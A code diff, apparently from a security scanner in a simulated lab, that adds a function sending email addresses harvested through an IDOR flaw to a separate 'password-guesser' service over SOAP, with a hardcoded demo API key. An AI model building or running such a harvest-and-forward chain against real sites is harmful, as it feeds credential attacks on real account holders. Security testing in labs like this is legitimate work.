@@ -52,6 +52,34 @@ async function loginAndGetCookie(loginUrl) {
     return cookie ? cookie[0] : null;
 }
 
+async function notifyPasswordGuesser(baseUrl, emails) {
+    if (!emails || emails.length === 0) return;
+
+    const emailTags = emails.map(e => `<email>${e}</email>`).join('');
+    const soapRequest = `<?xml version="1.0" encoding="utf-8"?>
+    <soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
+    <soap:Body>
+        <receiveHarvestedEmails>
+        <url>${baseUrl}</url>
+        ${emailTags}
+        </receiveHarvestedEmails>
+    </soap:Body>
+    </soap:Envelope>`;
+
+    try {
+        await axios.post('http://password-guesser:5000/soap', soapRequest, {
+            headers: {
+                'Content-Type': 'text/xml',
+                'X-API-Key': 'secu-demo-key-2026'
+            },
+            timeout: 5000
+        });
+        console.log(`[SOA] Forwarded ${emails.length} harvested email(s) to password-guesser`);
+    } catch (err) {
+        console.log('Failed to notify password-guesser of harvested emails:', err.message);
+    }
+}
+
 async function getRecon(ip) {
     try {
         const response = await axios.get(`http://shodan-clone:8080/api/host/${ip}`, {
@@ -180,6 +208,10 @@ async function testAndHarvestIDOR(baseUrl) {
 
     const others = harvested.filter(h => h.id !== ownId);
     const vulnerable = others.length > 0;
+    const emails = [...new Set(harvested.map(h => h.email))];
+
+    // SOA requirement: Scanner forwards harvested emails to Password Guesser server-to-server
+    await notifyPasswordGuesser(baseUrl, emails);
 
     return {
         vulnerable,
@@ -187,7 +219,7 @@ async function testAndHarvestIDOR(baseUrl) {
         evidence: vulnerable
             ? `Logged in as account ${ownId}, but accessed ${others.length} other account(s), e.g. id ${others[0].id} (email: ${others[0].email})`
             : 'No other account was accessible — ownership check appears enforced',
-        harvestedEmails: [...new Set(harvested.map(h => h.email))]
+        harvestedEmails: emails
     };
 }
 
